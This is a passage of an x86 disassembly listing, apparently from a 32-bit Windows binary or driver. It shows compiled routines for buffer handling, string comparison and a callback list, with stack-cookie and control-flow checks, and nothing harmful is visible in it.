  403040:	ff 15 b0 71 40 00    	call   *0x4071b0
  403046:	6a 00                	push   $0x0
  403048:	68 28 a8 40 00       	push   $0x40a828
  40304d:	6a 00                	push   $0x0
  40304f:	ff 75 08             	push   0x8(%ebp)
  403052:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403055:	50                   	push   %eax
  403056:	68 50 2e 40 00       	push   $0x402e50
  40305b:	ff 15 c0 70 40 00    	call   *0x4070c0
  403061:	85 c0                	test   %eax,%eax
  403063:	0f 99 c0             	setns  %al
  403066:	a2 30 a8 40 00       	mov    %al,0x40a830
  40306b:	8b e5                	mov    %ebp,%esp
  40306d:	5d                   	pop    %ebp
  40306e:	c2 04 00             	ret    $0x4
  403071:	cc                   	int3
  403072:	cc                   	int3
  403073:	cc                   	int3
  403074:	cc                   	int3
  403075:	cc                   	int3
  403076:	cc                   	int3
  403077:	cc                   	int3
  403078:	cc                   	int3
  403079:	cc                   	int3
  40307a:	cc                   	int3
  40307b:	cc                   	int3
  40307c:	cc                   	int3
  40307d:	cc                   	int3
  40307e:	cc                   	int3
  40307f:	cc                   	int3
  403080:	55                   	push   %ebp
  403081:	8b ec                	mov    %esp,%ebp
  403083:	8b 45 08             	mov    0x8(%ebp),%eax
  403086:	a3 34 a8 40 00       	mov    %eax,0x40a834
  40308b:	5d                   	pop    %ebp
  40308c:	c2 04 00             	ret    $0x4
  40308f:	cc                   	int3
  403090:	55                   	push   %ebp
  403091:	8b ec                	mov    %esp,%ebp
  403093:	81 ec 08 04 00 00    	sub    $0x408,%esp
  403099:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40309e:	33 c5                	xor    %ebp,%eax
  4030a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4030a3:	e8 e8 01 00 00       	call   0x403290
  4030a8:	84 c0                	test   %al,%al
  4030aa:	74 13                	je     0x4030bf
  4030ac:	83 3d 68 a7 40 00 ff 	cmpl   $0xffffffff,0x40a768
  4030b3:	75 1a                	jne    0x4030cf
  4030b5:	c7 05 68 a7 40 00 00 	movl   $0x0,0x40a768
  4030bc:	00 00 00 
  4030bf:	32 c0                	xor    %al,%al
  4030c1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4030c4:	33 cd                	xor    %ebp,%ecx
  4030c6:	e8 ab 3b 00 00       	call   0x406c76
  4030cb:	8b e5                	mov    %ebp,%esp
  4030cd:	5d                   	pop    %ebp
  4030ce:	c3                   	ret
  4030cf:	53                   	push   %ebx
  4030d0:	56                   	push   %esi
  4030d1:	6a 02                	push   $0x2
  4030d3:	e8 98 ea ff ff       	call   0x401b70
  4030d8:	68 00 04 00 00       	push   $0x400
  4030dd:	8b f0                	mov    %eax,%esi
  4030df:	c7 85 f8 fb ff ff 00 	movl   $0x0,-0x408(%ebp)
  4030e6:	00 00 00 
  4030e9:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  4030ef:	6a 00                	push   $0x0
  4030f1:	50                   	push   %eax
  4030f2:	e8 d9 37 00 00       	call   0x4068d0
  4030f7:	83 c4 0c             	add    $0xc,%esp
  4030fa:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  403100:	32 db                	xor    %bl,%bl
  403102:	50                   	push   %eax
  403103:	56                   	push   %esi
  403104:	68 40 a8 40 00       	push   $0x40a840
  403109:	e8 22 1a 00 00       	call   0x404b30
  40310e:	85 c0                	test   %eax,%eax
  403110:	78 4d                	js     0x40315f
  403112:	8b 85 f8 fb ff ff    	mov    -0x408(%ebp),%eax
  403118:	85 c0                	test   %eax,%eax
  40311a:	74 56                	je     0x403172
  40311c:	8d 50 0c             	lea    0xc(%eax),%edx
  40311f:	85 d2                	test   %edx,%edx
  403121:	74 42                	je     0x403165
  403123:	8b 48 08             	mov    0x8(%eax),%ecx
  403126:	85 c9                	test   %ecx,%ecx
  403128:	74 3b                	je     0x403165
  40312a:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  403130:	77 33                	ja     0x403165
  403132:	51                   	push   %ecx
  403133:	52                   	push   %edx
  403134:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  40313a:	50                   	push   %eax
  40313b:	e8 8a 37 00 00       	call   0x4068ca
  403140:	68 00 04 00 00       	push   $0x400
  403145:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  40314b:	68 40 c0 40 00       	push   $0x40c040
  403150:	50                   	push   %eax
  403151:	e8 b1 37 00 00       	call   0x406907
  403156:	83 c4 18             	add    $0x18,%esp
  403159:	85 c0                	test   %eax,%eax
  40315b:	75 02                	jne    0x40315f
  40315d:	b3 01                	mov    $0x1,%bl
  40315f:	8b 85 f8 fb ff ff    	mov    -0x408(%ebp),%eax
  403165:	85 c0                	test   %eax,%eax
  403167:	74 09                	je     0x403172
  403169:	6a 00                	push   $0x0
  40316b:	50                   	push   %eax
  40316c:	ff 15 ac 71 40 00    	call   *0x4071ac
  403172:	83 3d 68 a7 40 00 00 	cmpl   $0x0,0x40a768
  403179:	0f 85 e1 00 00 00    	jne    0x403260
  40317f:	80 fb 01             	cmp    $0x1,%bl
  403182:	0f 85 e1 00 00 00    	jne    0x403269
  403188:	8b 35 40 cc 40 00    	mov    0x40cc40,%esi
  40318e:	57                   	push   %edi
  40318f:	6a 00                	push   $0x0
  403191:	e8 da e9 ff ff       	call   0x401b70
  403196:	68 00 02 00 00       	push   $0x200
  40319b:	8b f8                	mov    %eax,%edi
  40319d:	c7 85 f8 fb ff ff 00 	movl   $0x0,-0x408(%ebp)
  4031a4:	00 00 00 
  4031a7:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  4031ad:	6a 00                	push   $0x0
  4031af:	50                   	push   %eax
  4031b0:	e8 1b 37 00 00       	call   0x4068d0
  4031b5:	83 c4 0c             	add    $0xc,%esp
  4031b8:	32 db                	xor    %bl,%bl
  4031ba:	85 f6                	test   %esi,%esi
  4031bc:	0f 84 9d 00 00 00    	je     0x40325f
  4031c2:	81 fe 00 02 00 00    	cmp    $0x200,%esi
  4031c8:	76 05                	jbe    0x4031cf
  4031ca:	be ff 01 00 00       	mov    $0x1ff,%esi
  4031cf:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  4031d5:	50                   	push   %eax
  4031d6:	57                   	push   %edi
  4031d7:	68 40 b0 40 00       	push   $0x40b040
  4031dc:	e8 4f 19 00 00       	call   0x404b30
  4031e1:	85 c0                	test   %eax,%eax
  4031e3:	78 67                	js     0x40324c
  4031e5:	8b 85 f8 fb ff ff    	mov    -0x408(%ebp),%eax
  4031eb:	85 c0                	test   %eax,%eax
  4031ed:	74 70                	je     0x40325f
  4031ef:	8d 50 0c             	lea    0xc(%eax),%edx
  4031f2:	85 d2                	test   %edx,%edx
  4031f4:	74 5c                	je     0x403252
  4031f6:	8b 48 08             	mov    0x8(%eax),%ecx
  4031f9:	85 c9                	test   %ecx,%ecx
  4031fb:	74 55                	je     0x403252
  4031fd:	81 f9 00 02 00 00    	cmp    $0x200,%ecx
  403203:	77 4d                	ja     0x403252
  403205:	51                   	push   %ecx
  403206:	52                   	push   %edx
  403207:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40320d:	50                   	push   %eax
  40320e:	e8 b7 36 00 00       	call   0x4068ca
  403213:	83 c4 0c             	add    $0xc,%esp
  403216:	b3 01                	mov    $0x1,%bl
  403218:	81 fe 00 02 00 00    	cmp    $0x200,%esi
  40321e:	73 2c                	jae    0x40324c
  403220:	33 d2                	xor    %edx,%edx
  403222:	85 f6                	test   %esi,%esi
  403224:	7e 26                	jle    0x40324c
  403226:	eb 08                	jmp    0x403230
  403228:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40322f:	90                   	nop
  403230:	0f be 82 40 c8 40 00 	movsbl 0x40c840(%edx),%eax
  403237:	0f be 8c 15 fc fd ff 	movsbl -0x204(%ebp,%edx,1),%ecx
  40323e:	ff 
  40323f:	2b c8                	sub    %eax,%ecx
  403241:	75 07                	jne    0x40324a
  403243:	42                   	inc    %edx
  403244:	3b d6                	cmp    %esi,%edx
  403246:	7c e8                	jl     0x403230
  403248:	eb 02                	jmp    0x40324c
  40324a:	32 db                	xor    %bl,%bl
  40324c:	8b 85 f8 fb ff ff    	mov    -0x408(%ebp),%eax
  403252:	85 c0                	test   %eax,%eax
  403254:	74 09                	je     0x40325f
  403256:	6a 00                	push   $0x0
  403258:	50                   	push   %eax
  403259:	ff 15 ac 71 40 00    	call   *0x4071ac
  40325f:	5f                   	pop    %edi
  403260:	a1 68 a7 40 00       	mov    0x40a768,%eax
  403265:	85 c0                	test   %eax,%eax
  403267:	7f 07                	jg     0x403270
  403269:	b8 0c 00 00 00       	mov    $0xc,%eax
  40326e:	eb 01                	jmp    0x403271
  403270:	48                   	dec    %eax
  403271:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403274:	a3 68 a7 40 00       	mov    %eax,0x40a768
  403279:	33 cd                	xor    %ebp,%ecx
  40327b:	5e                   	pop    %esi
  40327c:	8a c3                	mov    %bl,%al
  40327e:	5b                   	pop    %ebx
  40327f:	e8 f2 39 00 00       	call   0x406c76
  403284:	8b e5                	mov    %ebp,%esp
  403286:	5d                   	pop    %ebp
  403287:	c3                   	ret
  403288:	cc                   	int3
  403289:	cc                   	int3
  40328a:	cc                   	int3
  40328b:	cc                   	int3
  40328c:	cc                   	int3
  40328d:	cc                   	int3
  40328e:	cc                   	int3
  40328f:	cc                   	int3
  403290:	83 3d 38 a8 40 00 00 	cmpl   $0x0,0x40a838
  403297:	74 03                	je     0x40329c
  403299:	b0 01                	mov    $0x1,%al
  40329b:	c3                   	ret
  40329c:	e8 af 15 00 00       	call   0x404850
  4032a1:	a3 38 a8 40 00       	mov    %eax,0x40a838
  4032a6:	85 c0                	test   %eax,%eax
  4032a8:	0f 84 a6 00 00 00    	je     0x403354
  4032ae:	b9 00 08 00 00       	mov    $0x800,%ecx
  4032b3:	b8 40 a8 40 00       	mov    $0x40a840,%eax
  4032b8:	eb 06                	jmp    0x4032c0
  4032ba:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4032c0:	c6 00 00             	movb   $0x0,(%eax)
  4032c3:	8d 40 01             	lea    0x1(%eax),%eax
  4032c6:	83 e9 01             	sub    $0x1,%ecx
  4032c9:	75 f5                	jne    0x4032c0
  4032cb:	b9 00 08 00 00       	mov    $0x800,%ecx
  4032d0:	b8 40 b0 40 00       	mov    $0x40b040,%eax
  4032d5:	c6 00 00             	movb   $0x0,(%eax)
  4032d8:	8d 40 01             	lea    0x1(%eax),%eax
  4032db:	83 e9 01             	sub    $0x1,%ecx
  4032de:	75 f5                	jne    0x4032d5
  4032e0:	6a 04                	push   $0x4
  4032e2:	e8 89 e8 ff ff       	call   0x401b70
  4032e7:	50                   	push   %eax
  4032e8:	68 40 a8 40 00       	push   $0x40a840
  4032ed:	e8 09 36 00 00       	call   0x4068fb
  4032f2:	a1 38 a8 40 00       	mov    0x40a838,%eax
  4032f7:	50                   	push   %eax
  4032f8:	68 40 a8 40 00       	push   $0x40a840
  4032fd:	e8 f9 35 00 00       	call   0x4068fb
  403302:	83 c4 10             	add    $0x10,%esp
  403305:	6a 05                	push   $0x5
  403307:	e8 64 e8 ff ff       	call   0x401b70
  40330c:	50                   	push   %eax
  40330d:	68 40 a8 40 00       	push   $0x40a840
  403312:	e8 e4 35 00 00       	call   0x4068fb
  403317:	83 c4 08             	add    $0x8,%esp
  40331a:	6a 04                	push   $0x4
  40331c:	e8 4f e8 ff ff       	call   0x401b70
  403321:	50                   	push   %eax
  403322:	68 40 b0 40 00       	push   $0x40b040
  403327:	e8 cf 35 00 00       	call   0x4068fb
  40332c:	a1 38 a8 40 00       	mov    0x40a838,%eax
  403331:	50                   	push   %eax
  403332:	68 40 b0 40 00       	push   $0x40b040
  403337:	e8 bf 35 00 00       	call   0x4068fb
  40333c:	83 c4 10             	add    $0x10,%esp
  40333f:	6a 06                	push   $0x6
  403341:	e8 2a e8 ff ff       	call   0x401b70
  403346:	50                   	push   %eax
  403347:	68 40 b0 40 00       	push   $0x40b040
  40334c:	e8 aa 35 00 00       	call   0x4068fb
  403351:	83 c4 08             	add    $0x8,%esp
  403354:	83 3d 38 a8 40 00 00 	cmpl   $0x0,0x40a838
  40335b:	0f 95 c0             	setne  %al
  40335e:	c3                   	ret
  40335f:	cc                   	int3
  403360:	55                   	push   %ebp
  403361:	8b ec                	mov    %esp,%ebp
  403363:	51                   	push   %ecx
  403364:	e8 27 ff ff ff       	call   0x403290
  403369:	84 c0                	test   %al,%al
  40336b:	75 04                	jne    0x403371
  40336d:	8b e5                	mov    %ebp,%esp
  40336f:	5d                   	pop    %ebp
  403370:	c3                   	ret
  403371:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403374:	50                   	push   %eax
  403375:	68 40 a8 40 00       	push   $0x40a840
  40337a:	e8 d1 13 00 00       	call   0x404750
  40337f:	85 c0                	test   %eax,%eax
  403381:	78 12                	js     0x403395
  403383:	6a 01                	push   $0x1
  403385:	ff 75 fc             	push   -0x4(%ebp)
  403388:	e8 13 12 00 00       	call   0x4045a0
  40338d:	ff 75 fc             	push   -0x4(%ebp)
  403390:	e8 8b 13 00 00       	call   0x404720
  403395:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403398:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40339f:	50                   	push   %eax
  4033a0:	68 40 b0 40 00       	push   $0x40b040
  4033a5:	e8 a6 13 00 00       	call   0x404750
  4033aa:	85 c0                	test   %eax,%eax
  4033ac:	78 12                	js     0x4033c0
  4033ae:	6a 01                	push   $0x1
  4033b0:	ff 75 fc             	push   -0x4(%ebp)
  4033b3:	e8 e8 11 00 00       	call   0x4045a0
  4033b8:	ff 75 fc             	push   -0x4(%ebp)
  4033bb:	e8 60 13 00 00       	call   0x404720
  4033c0:	b0 01                	mov    $0x1,%al
  4033c2:	8b e5                	mov    %ebp,%esp
  4033c4:	5d                   	pop    %ebp
  4033c5:	c3                   	ret
  4033c6:	cc                   	int3
  4033c7:	cc                   	int3
  4033c8:	cc                   	int3
  4033c9:	cc                   	int3
  4033ca:	cc                   	int3
  4033cb:	cc                   	int3
  4033cc:	cc                   	int3
  4033cd:	cc                   	int3
  4033ce:	cc                   	int3
  4033cf:	cc                   	int3
  4033d0:	55                   	push   %ebp
  4033d1:	8b ec                	mov    %esp,%ebp
  4033d3:	83 ec 08             	sub    $0x8,%esp
  4033d6:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  4033da:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4033e1:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4033e8:	0f 84 4b 01 00 00    	je     0x403539
  4033ee:	8b 55 08             	mov    0x8(%ebp),%edx
  4033f1:	85 d2                	test   %edx,%edx
  4033f3:	0f 84 40 01 00 00    	je     0x403539
  4033f9:	80 3a 00             	cmpb   $0x0,(%edx)
  4033fc:	0f 84 37 01 00 00    	je     0x403539
  403402:	b9 00 04 00 00       	mov    $0x400,%ecx
  403407:	b8 40 b8 40 00       	mov    $0x40b840,%eax
  40340c:	8d 64 24 00          	lea    0x0(%esp),%esp
  403410:	c6 00 00             	movb   $0x0,(%eax)
  403413:	40                   	inc    %eax
  403414:	83 e9 01             	sub    $0x1,%ecx
  403417:	75 f7                	jne    0x403410
  403419:	51                   	push   %ecx
  40341a:	68 00 04 00 00       	push   $0x400
  40341f:	68 40 b8 40 00       	push   $0x40b840
  403424:	52                   	push   %edx
  403425:	e8 f6 26 00 00       	call   0x405b20
  40342a:	84 c0                	test   %al,%al
  40342c:	0f 84 07 01 00 00    	je     0x403539
  403432:	6a 03                	push   $0x3
  403434:	e8 f7 e6 ff ff       	call   0x401b30
  403439:	6a 1e                	push   $0x1e
  40343b:	50                   	push   %eax
  40343c:	68 40 b8 40 00       	push   $0x40b840
  403441:	e8 ca 18 00 00       	call   0x404d10
  403446:	85 c0                	test   %eax,%eax
  403448:	0f 84 eb 00 00 00    	je     0x403539
  40344e:	56                   	push   %esi
  40344f:	6a 00                	push   $0x0
  403451:	68 00 04 00 00       	push   $0x400
  403456:	68 40 b8 40 00       	push   $0x40b840
  40345b:	e8 c0 23 00 00       	call   0x405820
  403460:	8b f0                	mov    %eax,%esi
  403462:	85 f6                	test   %esi,%esi
  403464:	0f 84 c6 00 00 00    	je     0x403530
  40346a:	68 00 04 00 00       	push   $0x400
  40346f:	68 40 bc 40 00       	push   $0x40bc40
  403474:	56                   	push   %esi
  403475:	e8 75 34 00 00       	call   0x4068ef
  40347a:	83 c4 0c             	add    $0xc,%esp
  40347d:	85 c0                	test   %eax,%eax
  40347f:	0f 84 a5 00 00 00    	je     0x40352a
  403485:	68 00 04 00 00       	push   $0x400
  40348a:	56                   	push   %esi
  40348b:	68 40 bc 40 00       	push   $0x40bc40
  403490:	e8 60 34 00 00       	call   0x4068f5
  403495:	83 c4 0c             	add    $0xc,%esp
  403498:	c6 05 3f c0 40 00 00 	movb   $0x0,0x40c03f
  40349f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4034a2:	68 40 bc 40 00       	push   $0x40bc40
  4034a7:	50                   	push   %eax
  4034a8:	ff 15 e4 70 40 00    	call   *0x4070e4
  4034ae:	68 40 c0 40 00       	push   $0x40c040
  4034b3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4034b6:	50                   	push   %eax
  4034b7:	e8 e4 0f 00 00       	call   0x4044a0
  4034bc:	68 40 bc 40 00       	push   $0x40bc40
  4034c1:	e8 23 34 00 00       	call   0x4068e9
  4034c6:	68 00 04 00 00       	push   $0x400
  4034cb:	6a 00                	push   $0x0
  4034cd:	68 40 c8 40 00       	push   $0x40c840
  4034d2:	a3 3c a8 40 00       	mov    %eax,0x40a83c
  4034d7:	e8 f4 33 00 00       	call   0x4068d0
  4034dc:	6a 18                	push   $0x18
  4034de:	68 6c a7 40 00       	push   $0x40a76c
  4034e3:	68 40 c8 40 00       	push   $0x40c840
  4034e8:	e8 dd 33 00 00       	call   0x4068ca
  4034ed:	a1 3c a8 40 00       	mov    0x40a83c,%eax
  4034f2:	50                   	push   %eax
  4034f3:	68 40 bc 40 00       	push   $0x40bc40
  4034f8:	68 58 c8 40 00       	push   $0x40c858
  4034fd:	e8 c8 33 00 00       	call   0x4068ca
  403502:	a1 3c a8 40 00       	mov    0x40a83c,%eax
  403507:	83 c4 28             	add    $0x28,%esp
  40350a:	a2 54 c8 40 00       	mov    %al,0x40c854
  40350f:	8d 04 45 18 00 00 00 	lea    0x18(,%eax,2),%eax
  403516:	a3 40 cc 40 00       	mov    %eax,0x40cc40
  40351b:	8b 45 10             	mov    0x10(%ebp),%eax
  40351e:	5e                   	pop    %esi
  40351f:	c6 00 01             	movb   $0x1,(%eax)
  403522:	b0 01                	mov    $0x1,%al
  403524:	8b e5                	mov    %ebp,%esp
  403526:	5d                   	pop    %ebp
  403527:	c2 0c 00             	ret    $0xc
  40352a:	8b 45 10             	mov    0x10(%ebp),%eax
  40352d:	c6 00 00             	movb   $0x0,(%eax)
  403530:	b0 01                	mov    $0x1,%al
  403532:	5e                   	pop    %esi
  403533:	8b e5                	mov    %ebp,%esp
  403535:	5d                   	pop    %ebp
  403536:	c2 0c 00             	ret    $0xc
  403539:	32 c0                	xor    %al,%al
  40353b:	8b e5                	mov    %ebp,%esp
  40353d:	5d                   	pop    %ebp
  40353e:	c2 0c 00             	ret    $0xc
  403541:	cc                   	int3
  403542:	cc                   	int3
  403543:	cc                   	int3
  403544:	cc                   	int3
  403545:	cc                   	int3
  403546:	cc                   	int3
  403547:	cc                   	int3
  403548:	cc                   	int3
  403549:	cc                   	int3
  40354a:	cc                   	int3
  40354b:	cc                   	int3
  40354c:	cc                   	int3
  40354d:	cc                   	int3
  40354e:	cc                   	int3
  40354f:	cc                   	int3
  403550:	e8 3b fd ff ff       	call   0x403290
  403555:	84 c0                	test   %al,%al
  403557:	75 01                	jne    0x40355a
  403559:	c3                   	ret
  40355a:	a1 3c a8 40 00       	mov    0x40a83c,%eax
  40355f:	48                   	dec    %eax
  403560:	3d fe 01 00 00       	cmp    $0x1fe,%eax
  403565:	77 48                	ja     0x4035af
  403567:	68 40 c0 40 00       	push   $0x40c040
  40356c:	e8 90 33 00 00       	call   0x406901
  403571:	83 c4 04             	add    $0x4,%esp
  403574:	03 c0                	add    %eax,%eax
  403576:	50                   	push   %eax
  403577:	68 40 c0 40 00       	push   $0x40c040
  40357c:	6a 01                	push   $0x1
  40357e:	6a 02                	push   $0x2
  403580:	e8 eb e5 ff ff       	call   0x401b70
  403585:	50                   	push   %eax
  403586:	68 40 a8 40 00       	push   $0x40a840
  40358b:	e8 c0 16 00 00       	call   0x404c50
  403590:	a1 40 cc 40 00       	mov    0x40cc40,%eax
  403595:	50                   	push   %eax
  403596:	68 40 c8 40 00       	push   $0x40c840
  40359b:	6a 03                	push   $0x3
  40359d:	6a 00                	push   $0x0
  40359f:	e8 cc e5 ff ff       	call   0x401b70
  4035a4:	50                   	push   %eax
  4035a5:	68 40 b0 40 00       	push   $0x40b040
  4035aa:	e8 a1 16 00 00       	call   0x404c50
  4035af:	b0 01                	mov    $0x1,%al
  4035b1:	c3                   	ret
  4035b2:	cc                   	int3
  4035b3:	cc                   	int3
  4035b4:	cc                   	int3
  4035b5:	cc                   	int3
  4035b6:	cc                   	int3
  4035b7:	cc                   	int3
  4035b8:	cc                   	int3
  4035b9:	cc                   	int3
  4035ba:	cc                   	int3
  4035bb:	cc                   	int3
  4035bc:	cc                   	int3
  4035bd:	cc                   	int3
  4035be:	cc                   	int3
  4035bf:	cc                   	int3
  4035c0:	55                   	push   %ebp
  4035c1:	8b ec                	mov    %esp,%ebp
  4035c3:	83 ec 14             	sub    $0x14,%esp
  4035c6:	8b 45 08             	mov    0x8(%ebp),%eax
  4035c9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4035cc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4035cf:	33 c0                	xor    %eax,%eax
  4035d1:	80 7d 10 01          	cmpb   $0x1,0x10(%ebp)
  4035d5:	68 44 cc 40 00       	push   $0x40cc44
  4035da:	0f 95 c0             	setne  %al
  4035dd:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4035e4:	48                   	dec    %eax
  4035e5:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4035ec:	23 c1                	and    %ecx,%eax
  4035ee:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4035f1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4035f4:	ff 15 c8 70 40 00    	call   *0x4070c8
  4035fa:	84 c0                	test   %al,%al
  4035fc:	74 6a                	je     0x403668
  4035fe:	83 3d 48 cc 40 00 00 	cmpl   $0x0,0x40cc48
  403605:	74 61                	je     0x403668
  403607:	83 3d 44 cc 40 00 00 	cmpl   $0x0,0x40cc44
  40360e:	74 58                	je     0x403668
  403610:	56                   	push   %esi
  403611:	68 78 61 64 76       	push   $0x76646178
  403616:	6a 14                	push   $0x14
  403618:	6a 00                	push   $0x0
  40361a:	ff 15 f4 70 40 00    	call   *0x4070f4
  403620:	8b f0                	mov    %eax,%esi
  403622:	85 f6                	test   %esi,%esi
  403624:	74 41                	je     0x403667
  403626:	56                   	push   %esi
  403627:	ff 15 c8 70 40 00    	call   *0x4070c8
  40362d:	84 c0                	test   %al,%al
  40362f:	74 36                	je     0x403667
  403631:	6a 14                	push   $0x14
  403633:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403636:	50                   	push   %eax
  403637:	56                   	push   %esi
  403638:	e8 8d 32 00 00       	call   0x4068ca
  40363d:	a1 44 cc 40 00       	mov    0x40cc44,%eax
  403642:	83 c4 0c             	add    $0xc,%esp
  403645:	81 78 04 44 cc 40 00 	cmpl   $0x40cc44,0x4(%eax)
  40364c:	74 07                	je     0x403655
  40364e:	b9 03 00 00 00       	mov    $0x3,%ecx
  403653:	cd 29                	int    $0x29
  403655:	89 06                	mov    %eax,(%esi)
  403657:	c7 46 04 44 cc 40 00 	movl   $0x40cc44,0x4(%esi)
  40365e:	89 70 04             	mov    %esi,0x4(%eax)
  403661:	89 35 44 cc 40 00    	mov    %esi,0x40cc44
  403667:	5e                   	pop    %esi
  403668:	8b e5                	mov    %ebp,%esp
  40366a:	5d                   	pop    %ebp
  40366b:	c2 0c 00             	ret    $0xc
  40366e:	cc                   	int3
  40366f:	cc                   	int3
  403670:	68 44 cc 40 00       	push   $0x40cc44
  403675:	e8 16 eb ff ff       	call   0x402190
  40367a:	c3                   	ret
  40367b:	cc                   	int3
  40367c:	cc                   	int3
  40367d:	cc                   	int3
  40367e:	cc                   	int3
  40367f:	cc                   	int3
  403680:	68 44 cc 40 00       	push   $0x40cc44
  403685:	e8 56 eb ff ff       	call   0x4021e0
  40368a:	c3                   	ret
  40368b:	cc                   	int3
  40368c:	cc                   	int3
  40368d:	cc                   	int3
  40368e:	cc                   	int3
  40368f:	cc                   	int3
  403690:	55                   	push   %ebp
  403691:	8b ec                	mov    %esp,%ebp
  403693:	68 44 cc 40 00       	push   $0x40cc44
  403698:	ff 15 c8 70 40 00    	call   *0x4070c8
  40369e:	84 c0                	test   %al,%al
  4036a0:	74 3a                	je     0x4036dc
  4036a2:	83 3d 48 cc 40 00 00 	cmpl   $0x0,0x40cc48
  4036a9:	74 31                	je     0x4036dc
  4036ab:	a1 44 cc 40 00       	mov    0x40cc44,%eax
  4036b0:	85 c0                	test   %eax,%eax
  4036b2:	74 28                	je     0x4036dc
  4036b4:	3d 44 cc 40 00       	cmp    $0x40cc44,%eax
  4036b9:	74 21                	je     0x4036dc
  4036bb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4036be:	8b ff                	mov    %edi,%edi
  4036c0:	85 c0                	test   %eax,%eax
  4036c2:	74 18                	je     0x4036dc
  4036c4:	39 48 08             	cmp    %ecx,0x8(%eax)
  4036c7:	74 0d                	je     0x4036d6
  4036c9:	8b 00                	mov    (%eax),%eax
  4036cb:	3d 44 cc 40 00       	cmp    $0x40cc44,%eax
  4036d0:	75 ee                	jne    0x4036c0
  4036d2:	5d                   	pop    %ebp
  4036d3:	c2 04 00             	ret    $0x4
  4036d6:	8b 48 0c             	mov    0xc(%eax),%ecx
  4036d9:	89 48 10             	mov    %ecx,0x10(%eax)
  4036dc:	5d                   	pop    %ebp
  4036dd:	c2 04 00             	ret    $0x4
  4036e0:	55                   	push   %ebp
  4036e1:	8b ec                	mov    %esp,%ebp
  4036e3:	68 44 cc 40 00       	push   $0x40cc44
  4036e8:	ff 15 c8 70 40 00    	call   *0x4070c8
  4036ee:	84 c0                	test   %al,%al
  4036f0:	74 3a                	je     0x40372c
  4036f2:	83 3d 48 cc 40 00 00 	cmpl   $0x0,0x40cc48
  4036f9:	74 31                	je     0x40372c
  4036fb:	a1 44 cc 40 00       	mov    0x40cc44,%eax
  403700:	85 c0                	test   %eax,%eax
  403702:	74 28                	je     0x40372c
  403704:	3d 44 cc 40 00       	cmp    $0x40cc44,%eax
  403709:	74 21                	je     0x40372c
  40370b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40370e:	8b ff                	mov    %edi,%edi
  403710:	85 c0                	test   %eax,%eax
  403712:	74 18                	je     0x40372c
  403714:	39 48 08             	cmp    %ecx,0x8(%eax)
  403717:	74 0d                	je     0x403726
  403719:	8b 00                	mov    (%eax),%eax
  40371b:	3d 44 cc 40 00       	cmp    $0x40cc44,%eax
  403720:	75 ee                	jne    0x403710
  403722:	5d                   	pop    %ebp
  403723:	c2 08 00             	ret    $0x8
  403726:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403729:	89 48 0c             	mov    %ecx,0xc(%eax)
  40372c:	5d                   	pop    %ebp
  40372d:	c2 08 00             	ret    $0x8
  403730:	55                   	push   %ebp
  403731:	8b ec                	mov    %esp,%ebp
  403733:	68 44 cc 40 00       	push   $0x40cc44
  403738:	ff 15 c8 70 40 00    	call   *0x4070c8
  40373e:	84 c0                	test   %al,%al
  403740:	74 5a                	je     0x40379c
  403742:	83 3d 48 cc 40 00 00 	cmpl   $0x0,0x40cc48
  403749:	74 51                	je     0x40379c
  40374b:	56                   	push   %esi
  40374c:	8b 35 44 cc 40 00    	mov    0x40cc44,%esi
  403752:	85 f6                	test   %esi,%esi
  403754:	74 45                	je     0x40379b
  403756:	81 fe 44 cc 40 00    	cmp    $0x40cc44,%esi
  40375c:	74 3d                	je     0x40379b
  40375e:	53                   	push   %ebx
  40375f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403762:	57                   	push   %edi
  403763:	85 f6                	test   %esi,%esi
  403765:	74 32                	je     0x403799
  403767:	01 5e 10             	add    %ebx,0x10(%esi)
  40376a:	8b 46 10             	mov    0x10(%esi),%eax
  40376d:	3b 46 0c             	cmp    0xc(%esi),%eax
  403770:	72 1d                	jb     0x40378f
  403772:	8b 7e 08             	mov    0x8(%esi),%edi
  403775:	8b cf                	mov    %edi,%ecx
  403777:	ff 15 cc 71 40 00    	call   *0x4071cc
  40377d:	ff d7                	call   *%edi
  40377f:	84 c0                	test   %al,%al
  403781:	74 09                	je     0x40378c
  403783:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  40378a:	eb 03                	jmp    0x40378f
  40378c:	29 5e 10             	sub    %ebx,0x10(%esi)
  40378f:	8b 36                	mov    (%esi),%esi
  403791:	81 fe 44 cc 40 00    	cmp    $0x40cc44,%esi
  403797:	75 ca                	jne    0x403763
  403799:	5f                   	pop    %edi
  40379a:	5b                   	pop    %ebx
  40379b:	5e                   	pop    %esi
  40379c:	5d                   	pop    %ebp
